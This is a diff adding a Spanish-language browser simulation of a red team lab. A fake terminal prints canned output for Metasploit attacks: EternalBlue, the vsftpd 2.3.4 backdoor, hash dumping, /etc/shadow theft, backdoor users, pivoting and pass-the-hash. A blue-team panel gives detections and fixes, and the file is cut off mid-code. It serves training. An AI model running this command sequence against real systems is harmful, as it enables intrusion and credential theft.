@@ -1,0 +1,590 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Red Team Lab — Windows + Linux + Red interna</title>
+<style>
+  :root{font-family:"Fira Mono",Consolas,monospace;background:#0a0e14;color:#e2e8f0}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-size:14px}
+  .topbar{display:flex;flex-wrap:wrap;align-items:center;gap:12px;padding:12px 16px;background:#0d1420;border-bottom:1px solid #1a3a2a}
+  .logo{color:#4ade80;font-weight:700;letter-spacing:3px;font-size:13px}
+  .dot{display:inline-block;width:10px;height:10px;border-radius:50%;background:#4ade80;margin-right:8px;animation:pulse 2s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+  .meta{color:#64748b;font-size:11px}
+  .tabs{margin-left:auto;display:flex}
+  .tab{padding:6px 12px;font-size:12px;background:none;border:none;color:#64748b;cursor:pointer;border-bottom:2px solid transparent;font-family:inherit}
+  .tab.active{color:#4ade80;border-bottom-color:#4ade80}
+  .tab.active.blue{color:#38bdf8;border-bottom-color:#38bdf8}
+  .objbar{display:flex;flex-wrap:wrap;align-items:center;gap:6px;padding:8px 16px;background:#0b1119;border-bottom:1px solid #12241c}
+  .chip{font-size:11px;padding:2px 8px;border-radius:4px;border:1px solid #334155;color:#475569}
+  .chip.done{border-color:#22c55e66;color:#4ade80;background:#22c55e14}
+  .counter{margin-left:auto;font-size:11px;color:#94a3b8}
+  .banner{background:#facc1533;border-bottom:1px solid #facc1540;color:#fde047;padding:8px 16px;font-size:12px;display:none}
+  .console{height:62vh;overflow-y:auto;padding:12px 16px;cursor:text;line-height:1.55}
+  .console .ln{white-space:pre-wrap;word-break:break-all;color:#cbd5e1}
+  .g{color:#4ade80}.r{color:#f87171}.y{color:#fde047}.c{color:#22d3ee}.dim{color:#94a3b8}.w{color:#f1f5f9}.p{color:#f87171}
+  .inline{display:flex;align-items:center}
+  .inline .pr{white-space:pre}
+  #cmd{flex:1;background:transparent;border:none;outline:none;color:#f1f5f9;font:inherit;caret-color:#4ade80}
+  .panel{height:62vh;overflow-y:auto;padding:20px 26px;font-size:13.5px;line-height:1.65}
+  .panel h2{margin-bottom:8px;font-size:15px}
+  .h2g{color:#4ade80}.h2r{color:#f87171}.h2p{color:#c084fc}.h2o{color:#fb923c}.h2y{color:#fde047}.h2s{color:#38bdf8}
+  ol,ul{margin-left:22px;color:#cbd5e1}
+  li{margin-bottom:6px}
+  code{color:#22d3ee}
+  .hint{color:#fde047;font-size:11.5px}
+  .roe{border:1px solid #ef444455;border-radius:6px;padding:12px;background:#ef44440d;margin-top:22px}
+  .roe h2{color:#f87171;font-size:13px}
+  .roe ul{font-size:11.5px;color:#94a3b8}
+  .soc-intro{border:1px solid #38bdf855;border-radius:6px;padding:12px;background:#38bdf80d;margin-bottom:16px;font-size:12.5px;color:#cbd5e1}
+  .soc-intro h2{color:#38bdf8;font-size:14px}
+  .det{border-radius:6px;padding:12px;margin-bottom:12px;border:1px solid #334155;background:#0f172a55;opacity:.45}
+  .det.fired{border-color:#ef444466;background:#ef444412;opacity:1}
+  .det .tag{font-size:11px;font-weight:700;padding:2px 8px;border-radius:4px;background:#1e293b;color:#64748b;margin-right:8px}
+  .det.fired .tag{background:#ef444420;color:#f87171;border:1px solid #ef444455}
+  .det h3{display:inline;font-size:13px;color:#64748b}
+  .det.fired h3{color:#fca5a5}
+  .det .src{font-size:11px;color:#94a3b8;margin-top:4px}
+  .det .src span{color:#38bdf8}
+  .det pre{margin-top:8px;padding:8px;background:#00000088;border-radius:4px;font-size:11.5px;white-space:pre-wrap;word-break:break-all;color:#475569}
+  .det.fired pre{color:#bae6fd}
+  .det .fix{font-size:12px;margin-top:8px;color:#64748b}
+  .det.fired .fix{color:#cbd5e1}
+  .det .fix b{color:#4ade80}
+  .lesson{border:1px solid #22c55e55;border-radius:6px;padding:12px;background:#22c55e0d;margin-top:18px}
+  .lesson h2{color:#4ade80;font-size:13px}
+  .lesson ul{font-size:11.5px;color:#94a3b8}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <span class="dot"></span><span class="logo">RED TEAM LAB</span>
+  <span class="meta">| Windows 2008 R2 · MS17-010 &nbsp;+&nbsp; Ubuntu 16.04 · vsftpd backdoor &nbsp;+&nbsp; Red interna 192.168.50.0/24 |</span>
+  <div class="tabs">
+    <button class="tab active" id="tab-console" onclick="setTab('console')">TERMINAL</button>
+    <button class="tab" id="tab-instructions" onclick="setTab('instructions')">INSTRUCCIONES</button>
+    <button class="tab" id="tab-blue" onclick="setTab('blue')">BLUE TEAM / SOC</button>
+  </div>
+</div>
+<div class="objbar" id="objbar"></div>
+<div class="banner" id="banner">★ TODOS LOS OBJETIVOS COMPLETADOS · Escribe <b>cat flag_final.txt</b> en la terminal de Kali para reclamar la flag final de la operación.</div>
+<div class="console" id="console"></div>
+<div class="panel" id="panel" style="display:none"></div>
+
+<script>
+// ====== ESCENARIO ======
+const WIN_IP="10.10.10.5", LIN_IP="10.10.10.20", SQL_IP="192.168.50.30", LHOST="10.10.10.100";
+const SQL_HOST="SRV-SQL01";
+const FLAG_WIN="RT-LAB{w1nd0ws_pwn3d_l1k3_4_pr0}", FLAG_LIN="RT-LAB{l1nux_r007_fr0m_th3_sh4d0w}",
+      FLAG_SQL="RT-LAB{p4ss_th3_h4sh_1nt0_th3_c0r3}", FLAG_FINAL="RT-LAB{full_r3d_t34m_0p3r4t10n_c0mpl3t3}";
+const WIN_EXPLOIT="exploit/windows/smb/ms17_010_eternalblue",
+      LIN_EXPLOIT="exploit/unix/ftp/vsftpd_234_backdoor",
+      PSEXEC_EXPLOIT="exploit/windows/smb/psexec";
+
+const objectives=[
+ {id:"recon_win",label:"Recon Windows"},{id:"exploit_win",label:"Shell en Windows"},
+ {id:"privesc",label:"Escalada a SYSTEM"},{id:"hashdump",label:"Dump SAM"},
+ {id:"mimikatz",label:"Creds en claro (kiwi)"},{id:"persist",label:"Persistencia Windows"},
+ {id:"recon_lin",label:"Recon Linux"},{id:"exploit_lin",label:"Shell root en Linux"},
+ {id:"shadow",label:"Exfiltrar /etc/shadow"},{id:"persist_lin",label:"Persistencia Linux (SSH)"},
+ {id:"flag_win",label:"Flag Windows"},{id:"flag_lin",label:"Flag Linux"},
+ {id:"pivot",label:"Pivoting (autoroute)"},{id:"lateral",label:"Lateral: Pass-the-Hash → SRV-SQL01"},
+ {id:"flag_sql",label:"Flag SQL01"}];
+
+const detections=[
+ {id:"exploit_win",title:"Explotación MS17-010 / EternalBlue",tactic:"MITRE ATT&CK T1210 · Initial Access",source:"IDS/IPS (Suricata/Snort) + Firewall",eventId:"Alerta ET IDS",
+  log:["[**] [1:2019234:5] ET EXPLOIT Possible MS17-01 SMBv1 Exploit [**]","Alerta: 10.10.10.100 -> "+WIN_IP+" puerto 445 (TCP)","Prioridad: 1 (alta) — payload DoublePulsar detectado"],
+  fix:"Parchear KB4013389 (o superior), deshabilitar SMBv1 en todos los hosts, segmentar el puerto 445."},
+ {id:"exploit_win",title:"Servicio sospechoso instalado",tactic:"MITRE ATT&CK T1543 · Persistence",source:"Windows Event Log",eventId:"Event ID 7045",
+  log:["7045 — Se instaló un nuevo servicio en el sistema.","Nombre: VXhfqWk | Ruta: %COMSPEC% /B /C ...","Tipo: propio | Estado: iniciado"],
+  fix:"Restringir SeCreateServicePrivilege, EDR con reglas de creación de servicios, alertar nombres aleatorios."},
+ {id:"privesc",title:"Escalada de privilegios (Named Pipe Impersonation)",tactic:"MITRE ATT&CK T1134 · Privilege Escalation",source:"Sysmon + Windows Event Log",eventId:"Sysmon EID 1, 7045",
+  log:["Servicios efímeros con nombre aleatorio (VXhfqWk) seguidos de","privilegios SeImpersonate en procesos de usuario LAB\\svc_backup."],
+  fix:"Aplicar LAPS, revisar cuentas de servicio con exceso de privilege, monitorizar SeImpersonatePrivilege."},
+ {id:"hashdump",title:"Volcado de la base SAM",tactic:"MITRE ATT&CK T1003.002 · Credential Access",source:"Sysmon",eventId:"Sysmon EID 10",
+  log:["10 — ProcessAccess: LSASS.exe accedido por un proceso inusual","SourceImage: C:\\Windows\\Temp\\... | GrantedAccess: 0x1010 (VM_READ)","Target: lsass.exe (acceso a memoria de credenciales)"],
+  fix:"Credential Guard, deshabilitar wdigest, alertar acceso no firmado a LSASS, RunAsPPL."},
+ {id:"mimikatz",title:"Robo de credenciales en claro (Mimikatz/kiwi)",tactic:"MITRE ATT&CK T1003 · Credential Access",source:"Sysmon + AMSI",eventId:"Sysmon EID 10 + AMSI",
+  log:["Acceso a LSASS con lectura de memoria de wdigest/kerberos.","AMSI: payload con firmas conocidas de mimikatz detectado parcialmente."],
+  fix:"RunAsPPL, Credential Guard, rotar TODAS las credenciales expuestas (incluidas de dominio)."},
+ {id:"persist",title:"Persistencia: clave Run de registro",tactic:"MITRE ATT&CK T1547.001 · Persistence",source:"Sysmon + Windows Event Log",eventId:"Sysmon EID 12/13",
+  log:["13 — RegistryEvent: valor modificado en","HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdate","12 — Se creó C:\\Users\\Public\\winupd.exe (payload fuera de rutas habituales)"],
+  fix:"Monitorizar claves Run con Sysmon/FIM, AppLocker en C:\\Users\\Public, alertar binarios de sistema en rutas de usuario."},
+ {id:"exploit_lin",title:"Backdoor vsftpd 2.3.4 (CVE-2011-2523)",tactic:"MITRE ATT&CK T1190 · Initial Access",source:"IDS + logs FTP",eventId:"Alerta ET IDS + vsftpd.log",
+  log:["[**] ET EXPLOIT VSFTPD 2.3.4 Backdoor Connection Attempt [**]","Alerta: 10.10.10.100 -> "+LIN_IP+" puerto 21, patrón 'USER root:)' detectado","vsftpd.log: conexión inusual al puerto 6200"],
+  fix:"Actualizar vsftpd inmediatamente, no exponer FTP, filtrar el puerto 6200."},
+ {id:"shadow",title:"Lectura de /etc/shadow",tactic:"MITRE ATT&CK T1003.008 · Credential Access",source:"auditd / EDR Linux",eventId:"auditd",
+  log:['type=PATH msg=audit(...): name="/etc/shadow" uid=0',"lectura de /etc/shadow por shell no registrada en sesiones SSH habituales"],
+  fix:"Reglas auditd sobre archivos sensibles, alertar accesos root fuera de sesiones SSH, rotar credenciales."},
+ {id:"persist_lin",title:"Persistencia: SSH authorized_keys + usuario oculto",tactic:"MITRE ATT&CK T1098.004, T1136 · Persistence",source:"auditd + FIM (Wazuh/OSSEC)",eventId:"auditd + useradd",
+  log:['type=PATH name="/root/.ssh/authorized_keys" — archivo modificado por sesión no SSH',"useradd: se creó el usuario 'hacker' y se añadió a 'sudo'"],
+  fix:"FIM sobre ~/.ssh/authorized_keys, revisar miembros de sudo, alertar useradd en producción."},
+ {id:"pivot",title:"Pivoting hacia la red interna (autoroute)",tactic:"MITRE ATT&CK T1090 · Lateral Movement (relay)",source:"NetFlow / IDS",eventId:"NetFlow",
+  log:["Tráfico nuevo e inusual desde WIN-SRV-DC01 hacia 192.168.50.0/24","Un host de perímetro actuando como router no planificado","Túnel TCP saliente (portfwd) hacia 10.10.10.100:4444/4445"],
+  fix:"Segmentación estricta perímetro→red de servidores, alertar hosts que enrutan tráfico, bloquear C2 saliente."},
+ {id:"lateral",title:"Movimiento lateral Pass-the-Hash vía PSExec",tactic:"MITRE ATT&CK T1021.002 + T1550.002",source:"Windows Event Log",eventId:"Event ID 4624 (Tipo 3)",
+  log:["4624 — Inicio de sesión de red (Tipo 3):","Cuenta: Administrator | Desde: WIN-SRV-DC01 → "+SQL_HOST,"Paquete: NTLM (¡no Kerberos!) — hash reutilizado","7045 — servicio PEMZRQXS instalado en el destino"],
+  fix:"LAPS, restringir NTLM en el dominio, SMB signing obligatorio, alertar logons NTLM Tipo 3."},
+ {id:"flag_sql",title:"Compromiso del servidor crítico interno (SRV-SQL01)",tactic:"Impacto en el núcleo de la red",source:"Vista de incidente consolidado",eventId:"Correlación",
+  log:["Un servidor de base de datos interno quedó comprometido 6 pasos","después de una única intrusión inicial en el perímetro (MS17-010)."],
+  fix:"Lección: defensa en profundidad — parcheado automático + segmentación + LAPS + detección 24/7."}];
+
+// ====== ESTADO ======
+let mode="kali", module=null, busy=false, isSystem=false, completed=false;
+const done={}; const rhosts={win:false,lin:false,psexec:false};
+let host="win", pivot=false, tabNow="console";
+const term=document.getElementById("console"), panel=document.getElementById("panel"),
+      objbar=document.getElementById("objbar"), bannerEl=document.getElementById("banner");
+let inputBuf="";
+
+function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;")}
+function sleep(ms){return new Promise(r=>setTimeout(r,ms))}
+function addLine(text,cls){const d=document.createElement("div");d.className="ln "+(cls||"");d.textContent=text||"\u00A0";term.appendChild(d);term.scrollTop=term.scrollHeight}
+function mark(id){if(done[id])return;done[id]=true;renderObjs();if(objectives.every(o=>done[o.id])){completed=true;bannerEl.style.display="block"}}
+function renderObjs(){
+  objbar.innerHTML='<span class="dim" style="font-size:11px">OBJETIVOS: </span>'+
+    objectives.map(o=>'<span class="chip'+(done[o.id]?' done':'')+'">'+(done[o.id]?'✔':'○')+' '+o.label+'</span>').join('')+
+    '<span class="counter">'+objectives.filter(o=>done[o.id]).length+'/'+objectives.length+'</span>';
+}
+async function printOut(lines,clsMap){busy=true;renderInput(true);
+  for(const t of lines){await sleep(18+Math.random()*55);addLine(t,clsMap?clsMap(t):"")}
+  busy=false;renderInput(false)}
+async function slowOut(lines,delay){delay=delay||170;busy=true;renderInput(true);
+  for(const t of lines){await sleep(delay);addLine(t,t.indexOf("[+]")===0?"g":"")}
+  busy=false;renderInput(false)}
+
+function prompt(){ if(mode==="kali")return{p:"root@kali:~#",c:"g"};
+  if(mode==="msf")return{p:"msf6 "+(module?"exploit("+(module==="win"?WIN_EXPLOIT:module==="lin"?LIN_EXPLOIT:PSEXEC_EXPLOIT)+")":"")+">",c:"p"};
+  if(mode==="meterpreter")return{p:"meterpreter >",c:"c"};
+  if(mode==="linshell")return{p:"root@web01:~#",c:"g"};
+  return{p:"C:\\Windows\\system32>",c:"w"}}
+
+function renderInput(dis){
+  const el=document.getElementById("inputline");
+  if(el)el.remove();
+  const wrap=document.createElement("div");wrap.className="inline";wrap.id="inputline";
+  const pr=prompt();
+  wrap.innerHTML='<span class="pr '+pr.c+'" style="margin-right:8px">'+esc(pr.p)+'</span>';
+  const inp=document.createElement("input");inp.id="cmd";inp.autocomplete="off";inp.spellcheck=false;
+  inp.value=inputBuf;inp.disabled=!!dis;inp.oninput=()=>inputBuf=inp.value;
+  inp.onkeydown=async e=>{if(e.key==="Enter"&&!busy){const v=inp.value;inputBuf="";inp.value="";await handleCmd(v)}};
+  wrap.appendChild(inp);term.appendChild(wrap);term.scrollTop=term.scrollHeight;
+  if(!dis)inp.focus();
+}
+term.addEventListener("click",()=>{const i=document.getElementById("cmd");if(i&&!i.disabled)i.focus()});
+
+function red(t){return t.indexOf("VULNERABLE")>=0||t.indexOf("HIGH")>=0?"r":""}
+
+function nmapWin(full){const b=["Starting Nmap 7.94 ( https://nmap.org )","Nmap scan report for "+WIN_IP,"Host is up (0.00042s latency).","",
+  "PORT      STATE SERVICE       VERSION","135/tcp   open  msrpc         Microsoft Windows RPC",
+  "139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn",
+  "445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (lane server comment: WIN-SRV-DC01)"];
+  if(full)b.push("3389/tcp  open  msrdp?","MAC Address: 00:0C:29:8A:41:D2 (VMware)","","Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2","",
+  "Host script results:","|_nbstat: NetBIOS name: WIN-SRV-DC01, NetBIOS user: <unknown>","| smb2-security-mode:","|   2:0:2:53:",
+  "|     Message signing enabled but not required","|_smb-vuln-ms17-010:","|_  VULNERABLE:  Remote Code Execution vulnerability in Microsoft SMBv1 (ms17-010)",
+  "|     State: VULNERABLE","|     IDs:  cve:CVE-2017-0143","|_    Risk factor: HIGH  CVSS: 8.1","",
+  "Nmap done: 1 IP address (1 host up) scanned in 12.41 seconds");
+  else b.push("","MAC Address: 00:0C:29:8A:41:D2 (VMware)","","Nmap done: 1 IP address (1 host up) scanned in 1.94 seconds");
+  return b}
+function nmapLin(full){const b=["Starting Nmap 7.94 ( https://nmap.org )","Nmap scan report for "+LIN_IP,"Host is up (0.00039s latency).","",
+  "PORT   STATE SERVICE VERSION","21/tcp open  ftp     vsftpd 2.3.4","22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (protocol 2.0)",
+  "80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))"];
+  if(full)b.push("|_http-server-header: Apache/2.4.18 (Ubuntu)","|_http-title: Site under maintenance — web01.lab.local",
+  "MAC Address: 00:0C:29:B1:7C:33 (VMware)","","Service Info: OS: Linux; CPE: cpe:/o:canonical:ubuntu_linux:16.04","",
+  "| ftp-anon: Anonymous FTP login allowed (FTP code 230)","|_vsftpd 2.3.4 — version backdoored (CVE-2011-2523)","| ftp-vuln-cve2011-2523:",
+  "|_  VULNERABLE: vsftpd 2.3.4 backdoor — RCE as root","|     State: VULNERABLE","|_    Risk factor: HIGH  CVSS: 9.3","",
+  "Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds");
+  else b.push("","MAC Address: 00:0C:29:B1:7C:33 (VMware)","","Nmap done: 1 IP address (1 host up) scanned in 1.73 seconds");
+  return b}
+
+async function runAutoroute(){
+  if(pivot)return printOut(["[*] Route already exists to 192.168.50.0/24 via session 1"]);
+  pivot=true;mark("pivot");
+  return slowOut(["[*] Running module against WIN-SRV-DC01...","",
+  "[*] Meterpreter session 1 (10.10.10.5) has a second NIC on 192.168.50.0/24",
+  "[*] Adding a route to 192.168.50.0/255.255.255.0...",
+  "[+] Route added to subnet 192.168.50.0/255.255.255.0 from Netlink of session 1","",
+  "[+] PIVOTE ACTIVO: Kali ahora alcanza la red interna a través del servidor comprometido.",
+  "[*] Descubre hosts con 'arp' y muévete lateralmente con psexec + Pass-the-Hash.",""],150)}
+
+async function handleCmd(raw){
+  const cmd=raw.trim(),pr=prompt();
+  addLine(pr.p+" "+cmd,"w");
+  if(!cmd)return;
+  const parts=cmd.split(/\s+/),c=parts[0],args=parts.slice(1),low=c.toLowerCase();
+
+  // ---------- KALI ----------
+  if(mode==="kali"){
+    if(low==="clear"){term.innerHTML="";return renderInput(false)}
+    if(low==="help")return printOut(["Comandos disponibles:","  ifconfig · ping <ip> · nmap -sV -sC -p- <ip> · msfconsole","  clear · whoami · cat flag_final.txt","",
+      "Objetivos: "+WIN_IP+" (Windows 2008 R2) · "+LIN_IP+" (Ubuntu, vsftpd 2.3.4)"]);
+    if(low==="whoami")return printOut(["root"]);
+    if(low==="ifconfig")return printOut(["eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500",
+      "        inet 10.10.10.100  netmask 255.255.255.0  broadcast 10.10.10.255","        ether 08:00:27:4d:8c:aa  txqueuelen 1000  (Ethernet)","",
+      "lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536","        inet 127.0.0.1  netmask 255.0.0.0"]);
+    if(low==="ping"){const ip=args.find(a=>!a.startsWith("-"));
+      if(ip===WIN_IP||ip===LIN_IP){mark("recon_win");return printOut(["PING "+ip+" ("+ip+") 56(84) bytes of data.",
+        "64 bytes from "+ip+": icmp_seq=1 ttl="+(ip===WIN_IP?128:64)+" time=0.41 ms","64 bytes from "+ip+": icmp_seq=2 ttl="+(ip===WIN_IP?128:64)+" time=0.39 ms","",
+        "--- "+ip+" ping statistics ---","2 packets transmitted, 2 received, 0% packet loss"])}
+      return printOut(["ping: "+(ip||"destino")+": Nombre o servicio no conocido"])}
+    if(low==="nmap"){const t=args.find(a=>/^\d+\.\d+\.\d+\.\d+$/.test(a));
+      if(!t)return printOut(["Usage: nmap [Scan Type(s)] [Options] {target specification}"]);
+      const full=args.includes("-sV")||args.includes("-sC")||args.includes("-A")||args.includes("-p-")||args.includes("--script");
+      if(t===WIN_IP){mark("recon_win");return printOut(nmapWin(full),red)}
+      if(t===LIN_IP){mark("recon_lin");return printOut(nmapLin(full),red)}
+      return printOut(["Starting Nmap 7.94","Failed to resolve \""+t+"\".","Nmap done: 0 IP addresses scanned"])}
+    if(low==="msfconsole"){mode="msf";renderInput(false);return printOut([
+      "       =[ metasploit v6.4.1-dev                         ]",
+      "+ -- --=[ 2423 exploits - 1245 auxiliary - 421 post       ]",
+      "+ -- --=[ 1461 payloads - 47 encoders - 11 nops          ]",
+      "       =[ Metasploit Consulting: https://metasploit.com   ]","","Welcome to the Metasploit Framework. Type 'help' for available commands.","",
+      "       =[ You are running as 'root', be careful! ]=",""])}
+    if(low==="cat"&&args[0]==="flag_final.txt"){
+      if(completed)return printOut([FLAG_FINAL,"","★ OPERACIÓN COMPLETA — informe final listo para el cliente.",""],"y");
+      const f=objectives.filter(o=>!done[o.id]).map(o=>o.label);
+      return printOut(["cat: flag_final.txt: No existe el archivo","(Pista: te faltan objetivos: "+f.join(", ")+")"])}
+    return printOut([low+": command not found"])}
+
+  // ---------- MSF ----------
+  if(mode==="msf"){
+    if(low==="clear"){term.innerHTML="";return renderInput(false)}
+    if(low==="help"||low==="?")return printOut(["Comandos del módulo:","  search eternalblue · search vsftpd · search psexec",
+      "  use "+WIN_EXPLOIT,"  use "+LIN_EXPLOIT,"  use "+PSEXEC_EXPLOIT+"   (lateral, tras hashdump + autoroute)",
+      "  show options · set RHOSTS <ip> · exploit · back · exit"]);
+    if(low==="search"){const q=args.join(" ").toLowerCase();
+      if(q.includes("psexec")||q.includes("lateral"))return printOut(["","Matching Modules","================","",
+        "   #  Name                                Disclosure Date  Rank    Check","   -  ----                                ---------------  ----    -----",
+        "   0  "+PSEXEC_EXPLOIT+"                    1999-01-01       manual  Yes","","[*] Ideal para movimiento lateral con Pass-the-Hash.",""]);
+      if(q.includes("vsftpd")||q.includes("ftp"))return printOut(["","Matching Modules","================","",
+        "   #  Name                                Disclosure Date  Rank      Check","   -  ----                                ---------------  ----      -----",
+        "   0  "+LIN_EXPLOIT+"         2011-07-03       excellent No",""]);
+      if(q.includes("eternalblue")||q.includes("ms17")||q.includes("smb"))return printOut(["","Matching Modules","================","",
+        "   #  Name                                Disclosure Date  Rank    Check","   -  ----                                ---------------  ----    -----",
+        "   0  "+WIN_EXPLOIT+"   2017-03-14       great   Yes",
+        "   1  exploit/windows/smb/ms17_010_psexec        2017-03-14       normal  Yes",""]);
+      return printOut(["","[!] No results from search.",""])}
+    if(low==="use"){
+      if(args[0]===WIN_EXPLOIT){module="win";return printOut(["[*] Using configured payload windows/x64/meterpreter/reverse_tcp"])}
+      if(args[0]===LIN_EXPLOIT){module="lin";return printOut(["[*] Using configured payload cmd/unix/interact"])}
+      if(args[0]===PSEXEC_EXPLOIT){module="psexec";return printOut(["[*] Using configured payload windows/meterpreter/reverse_tcp"])}
+      return printOut(["[-] Unknown module: "+args.join(" ")])}
+    if(low==="back"){module=null;return}
+    if(low==="exit"||low==="quit"){mode="kali";module=null;return renderInput(false)}
+    if(!module)return printOut(["[-] Unknown command: "+c+". Escribe 'help'."]);
+    if(low==="show"&&args[0]==="options"){
+      if(module==="psexec")return printOut(["","Module options ("+PSEXEC_EXPLOIT+"):",
+        "","   Name       Current Setting  Required  Description","   ----       ---------------  --------  -----------",
+        "   RHOSTS     "+(rhosts.psexec?SQL_IP:"")+"          yes       The target address range",
+        "   RPORT      445              yes       The SMB service port",
+        "   SMBDomain  LAB              yes       The Windows domain to use",
+        "   SMBUser    Administrator    yes       The username to authenticate as",
+        "   SMBPass                     yes       (Pass-the-Hash: SMBPass = <LM>:<NTLM>)","",
+        "Payload options (windows/meterpreter/reverse_tcp):","","   LHOST      "+LHOST+"           yes       The listen address","   LPORT      4445              yes       The listen port",""]);
+      if(module==="win")return printOut(["","Module options ("+WIN_EXPLOIT+"):","",
+        "   Name              Current Setting  Required  Description","   ----              ---------------  --------  -----------",
+        "   GROOMALLOCATIONS  12               yes       Number of grooming allocations",
+        "   RHOSTS            "+(rhosts.win?WIN_IP:"")+"             yes       The target host(s)",
+        "   RPORT             445              yes       The SMB service port","",
+        "Payload options (windows/x64/meterpreter/reverse_tcp):","",
+        "   LHOST     "+LHOST+"              yes       The listen address","   LPORT     4444             yes       The listen port",""]);
+      return printOut(["","Module options ("+LIN_EXPLOIT+"):","",
+        "   Name    Current Setting  Required  Description","   ----    ---------------  --------  -----------",
+        "   RHOSTS  "+(rhosts.lin?LIN_IP:"")+"            yes       The target address","   RPORT   21               yes       The target port (FTP)",""])}
+    if(low==="set"){const k=args[0],v=args[1];
+      if(!v)return printOut(["[-] Usage: set RHOSTS <ip>"]);
+      if(k==="RHOSTS"&&v===WIN_IP&&module==="win"){rhosts.win=true;return printOut(["RHOSTS => "+WIN_IP])}
+      if(k==="RHOSTS"&&v===LIN_IP&&module==="lin"){rhosts.lin=true;return printOut(["RHOSTS => "+LIN_IP])}
+      if(k==="RHOSTS"&&v===SQL_IP&&module==="psexec"){rhosts.psexec=true;return printOut(["RHOSTS => "+SQL_IP])}
+      if(k==="RHOSTS")return printOut(["RHOSTS => "+v,"[*] Nota: el módulo apunta al objetivo "+(module==="win"?WIN_IP:module==="lin"?LIN_IP:SQL_IP)]);
+      return printOut([k+" => "+v])}
+    if(low==="exploit"||low==="run"){
+      if(module==="win"){
+        if(!rhosts.win)return printOut(["[-] Exploit aborted: RHOSTS no está configurado.","[*] Usa: set RHOSTS "+WIN_IP]);
+        mark("exploit_win");mode="meterpreter";
+        await slowOut(["[*] Started reverse TCP handler on "+LHOST+":4444","[*] "+WIN_IP+":445 - Target OS: Windows Server 2008 R2",
+          "[*] "+WIN_IP+":445 - Connecting to target for exploitation.","[*] "+WIN_IP+":445 - Target OS selected: Windows 7 / 2008 R2 SP1",
+          "[*] "+WIN_IP+":445 - TOTAL HEAP SIZE: 0x2c000000 bytes (~704 MB)","[*] "+WIN_IP+":445 - Filling tank with shellcode...",
+          "[*] "+WIN_IP+":445 - Preparing the GROOM allocations...","[*] "+WIN_IP+":445 - Sending all but last packet of the wraparound transaction.",
+          "[*] "+WIN_IP+":445 - Sending the last packet of the wraparound transaction.",
+          "[+] "+WIN_IP+":445 - Got connection, sending stage (201493 bytes)",
+          "[+] Meterpreter session 1 opened ("+LHOST+":4444 -> "+WIN_IP+":49154)","",
+          "meterpreter session 1 is running as LAB\\svc_backup (usuario de bajo privilegio)",""],170);
+        return renderInput(false)}
+      if(module==="psexec"){
+        if(!rhosts.psexec)return printOut(["[-] Exploit aborted: RHOSTS no está configurado.","[*] Usa: set RHOSTS "+SQL_IP]);
+        if(!pivot)return printOut(["[-] "+SQL_IP+" es inalcanzable desde Kali: está en la red interna 192.168.50.0/24.",
+          "[*] Necesitas un pivote: en Meterpreter ejecuta 'run autoroute'."]);
+        if(!done.hashdump)return printOut(["[-] No tienes material de autenticación para el movimiento lateral.",
+          "[*] Ejecuta 'hashdump' en Meterpreter para obtener el hash NTLM de Administrator."]);
+        mark("lateral");
+        await slowOut(["[*] Authenticating to "+SQL_IP+":445 as LAB\\Administrator with NTLM hash (Pass-the-Hash)...",
+          "[*] Sending stage (201493 bytes) to 192.168.50.30 via pivot route...",
+          "[+] "+SQL_IP+":445 - Executing the payload via PSExec service (PEMZRQXS)...",
+          "[+] Meterpreter session 3 opened ("+LHOST+":4445 -> "+SQL_IP+":49155)","",
+          "[+] Acceso obtenido en "+SQL_HOST+" como NT AUTHORITY\\SYSTEM.",""],190);
+        mode="meterpreter";host="sql";return renderInput(false)}
+      if(module==="lin"){
+        if(!rhosts.lin)return printOut(["[-] Exploit aborted: RHOSTS no está configurado.","[*] Usa: set RHOSTS "+LIN_IP]);
+        mark("exploit_lin");
+        await slowOut(["[*] "+LIN_IP+":21 - Banner: 220 (vsFTPd 2.3.4)","[*] "+LIN_IP+":21 - Sending backdoor trigger: USER root:)",
+          "[*] "+LIN_IP+":21 - Backdoor service detected on port 6200","[+] "+LIN_IP+":21 - The backdoor service is running...",
+          "[+] "+LIN_IP+":21 - UID found: uid=0(root) gid=0(root)",
+          "[+] Command shell session 2 opened ("+LHOST+":4444 -> "+LIN_IP+":6200)","",
+          "WARNING: raw shell — session 2 running as ROOT en web01.",""],170);
+        mode="linshell";return renderInput(false)}}
+    return printOut(["[-] Unknown command: "+c])}
+
+  // ---------- METERPRETER ----------
+  if(mode==="meterpreter"){
+    const onSql=host==="sql";
+    if(low==="clear"){term.innerHTML="";return renderInput(false)}
+    if(low==="help")return printOut(["Meterpreter (Windows):","── BÁSICOS ──  sysinfo · getuid",
+      "── ESCALADA ──  getsystem · getprivs",
+      "── POST-EXPLOITACIÓN ──  hashdump · creds_all (mimikatz) · persistence · screenshot",
+      "── PIVOTING ──  ifconfig · arp · run autoroute · route · portfwd add -l 3389 -p 3389 -r "+SQL_IP,
+      "── MOVIMIENTO ──  shell · ps · exit"]);
+    if(low==="sysinfo")return printOut(["Computer        : "+(onSql?SQL_HOST:"WIN-SRV-DC01"),
+      "OS              : Windows Server "+(onSql?"2012 R2 (Build 9601)":"2008 R2 (Build 7601, SP1)")+".",
+      "Architecture    : x64","System Language : es_ES","Domain          : LAB",
+      "Logged On As    : "+(isSystem?"NT AUTHORITY\\SYSTEM":"LAB\\svc_backup"),"Meterpreter     : x64/windows"]);
+    if(low==="getuid")return printOut(["Server username: "+(isSystem?"NT AUTHORITY\\SYSTEM":"LAB\\svc_backup")]);
+    if(low==="ifconfig"||low==="ipconfig")return printOut(["","Interface  1","============","",
+      "Name         : Intel(R) PRO/1000 MT Network Connection","Hardware MAC : 00:0c:29:8a:41:d2","MTU          : 1500",
